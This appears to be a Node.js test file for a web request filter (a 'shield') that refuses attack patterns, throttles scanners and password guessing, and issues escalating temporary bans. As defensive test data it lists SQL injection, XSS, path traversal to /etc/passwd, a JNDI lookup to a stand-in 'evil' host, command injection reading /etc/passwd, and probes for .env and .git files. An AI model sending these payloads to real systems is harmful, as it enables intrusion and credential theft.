import test from "node:test";
import assert from "node:assert/strict";
import { createShield } from "../shield.js";

const IP = "203.0.113.7";
const make = () => {
  const clock = { t: 1_000_000 };
  const shield = createShield({ now: () => clock.t, log: () => {} });
  return { shield, clock };
};
const req = (url, extra = {}) => ({ method: "GET", url, headers: { "user-agent": "Mozilla/5.0" }, ...extra });

test("normal visitors are never touched", () => {
  const { shield, clock } = make();
  for (const url of ["/", "/software", "/products/surgical-instruments", "/css/styles.css?v=1", "/api/auth/me", "/auth/google/callback?code=4%2F0AfJohXn_abc-123&state=Zk93Qx"]) {
    assert.equal(shield.inspect(req(url), IP), null, url);
    shield.observe(req(url), IP, 200);
    clock.t += 500;
  }
  assert.equal(shield.state(IP).level, "normal");
});

test("known attack patterns are refused before reaching the server", () => {
  const { shield } = make();
  const attacks = [
    "/api/products?id=1%20UNION%20SELECT%20password%20FROM%20users",
    "/api/products?id=1' OR '1'='1",
    "/?q=<script>alert(1)</script>",
    "/?q=%3Cscript%3Ealert(1)%3C/script%3E",
    "/..%2f..%2fetc/passwd",
    "/images/../../etc/passwd",
    "/?x=${jndi:ldap://evil/a}",
    "/api/x?name=a;cat /etc/passwd",
    "/?file=%252e%252e%252fsecret"
  ];
  for (const url of attacks) {
    const verdict = shield.inspect(req(url), IP === "x" ? "" : `198.51.100.${attacks.indexOf(url) + 1}`);
    assert.ok(verdict && verdict.status >= 400, `${url} should be refused`);
  }
});

test("probing for files this site does not have is refused", () => {
  const { shield } = make();
  for (const url of ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/xmlrpc.php", "/backup.sql", "/shell.php"]) {
    assert.ok(shield.inspect(req(url), "198.51.100.50"), url);
  }
});

test("scanner tools and strange methods are refused", () => {
  const { shield } = make();
  assert.equal(shield.inspect(req("/", { headers: { "user-agent": "sqlmap/1.7" } }), "198.51.100.60").status, 403);
  assert.equal(shield.inspect(req("/", { method: "TRACE" }), "198.51.100.61").status, 405);
  assert.equal(shield.inspect(req("/?" + "a".repeat(5000)), "198.51.100.62").status, 414);
});

test("repeated attacks escalate from refusal to a temporary ban, and bans get longer", () => {
  const { shield, clock } = make();
  let banned = false;
  for (let i = 0; i < 6 && !banned; i++) {
    shield.inspect(req("/?q=<script>x</script>"), IP);
    banned = shield.state(IP).level === "banned";
    clock.t += 1000;
  }
  assert.ok(banned, "the third attack in a few seconds bans the address");
  const verdict = shield.inspect(req("/"), IP);
  assert.equal(verdict.status, 403);
  assert.ok(verdict.retryAfter > 500 && verdict.retryAfter <= 600, "first ban is about ten minutes");

  clock.t += 11 * 60000;
  assert.equal(shield.inspect(req("/"), IP), null, "the ban ends by itself");

  for (let i = 0; i < 6 && shield.state(IP).level !== "banned"; i++) {
    shield.inspect(req("/?q=<script>x</script>"), IP);
    clock.t += 1000;
  }
  const second = shield.inspect(req("/"), IP);
  assert.ok(second.retryAfter > 3000 && second.retryAfter <= 3600, "second ban is about an hour");
});

test("behaviour, not volume: a fast but well behaved visitor is not throttled", () => {
  const { shield, clock } = make();
  for (let i = 0; i < 300; i++) {
    assert.equal(shield.inspect(req("/js/app.js"), IP), null);
    shield.observe(req("/js/app.js"), IP, 200);
    clock.t += 20;
  }
  assert.equal(shield.state(IP).level, "normal");
});

test("a scanner hitting many missing pages is throttled and then banned", () => {
  const { shield, clock } = make();
  const levels = new Set();
  for (let i = 0; i < 40; i++) {
    const r = req(`/missing-${i}.png`);
    if (!shield.inspect(r, IP)) shield.observe(r, IP, 404);
    levels.add(shield.state(IP).level);
    clock.t += 300;
  }
  assert.ok(levels.has("throttled") || levels.has("banned"));
  assert.equal(shield.state(IP).level, "banned");
});

test("password guessing escalates: failures, then throttle, then ban", () => {
  const { shield, clock } = make();
  const seen = [];
  for (let i = 0; i < 20; i++) {
    const r = { method: "POST", url: "/api/auth/login", headers: { "user-agent": "Mozilla/5.0" } };
    const verdict = shield.inspect(r, IP);
    seen.push(verdict ? verdict.reason : "passed");
    if (!verdict) shield.observe(r, IP, 401);
    clock.t += 2500;
  }
  assert.ok(seen.includes("throttled") || seen.includes("banned"));
  assert.ok(seen.includes("banned"));
});

test("a person who mistypes a password a couple of times is fine", () => {
  const { shield, clock } = make();
  for (let i = 0; i < 3; i++) {
    const r = { method: "POST", url: "/api/auth/login", headers: { "user-agent": "Mozilla/5.0" } };
    assert.equal(shield.inspect(r, IP), null);
    shield.observe(r, IP, 401);
    clock.t += 4000;
  }
  assert.equal(shield.state(IP).level, "normal");
});

test("the score fades while the visitor behaves", () => {
  const { shield, clock } = make();
  const r = req("/api/auth/login");
  for (let i = 0; i < 5; i++) shield.observe(r, IP, 401);
  assert.ok(shield.state(IP).score > 20);
  clock.t += 5 * 60000;
  assert.equal(shield.state(IP).score, 0);
});

test("private addresses (the host's own health checks) are never scored", () => {
  const { shield } = make();
  for (let i = 0; i < 50; i++) {
    assert.equal(shield.inspect(req("/.env"), "10.0.0.5"), null);
    shield.observe(req("/x"), "10.0.0.5", 404);
  }
  assert.equal(shield.size(), 0);
});

test("the allowlist and the off switch work, and memory stays bounded", () => {
  const off = createShield({ enabled: false, log: () => {} });
  assert.equal(off.inspect(req("/.env"), IP), null);
  const listed = createShield({ allowlist: [IP], log: () => {} });
  assert.equal(listed.inspect(req("/.env"), IP), null);
  const small = createShield({ settings: { maxVisitors: 50 }, log: () => {} });
  for (let i = 0; i < 500; i++) small.inspect(req("/?q=<script>"), `198.51.${Math.floor(i / 250)}.${i % 250}`);
  assert.ok(small.size() <= 100);
});

test("a fault inside the shield lets the request through", () => {
  const { shield } = make();
  assert.equal(shield.inspect({ method: "GET", get url() { throw new Error("boom"); }, headers: {} }, IP), null);
});
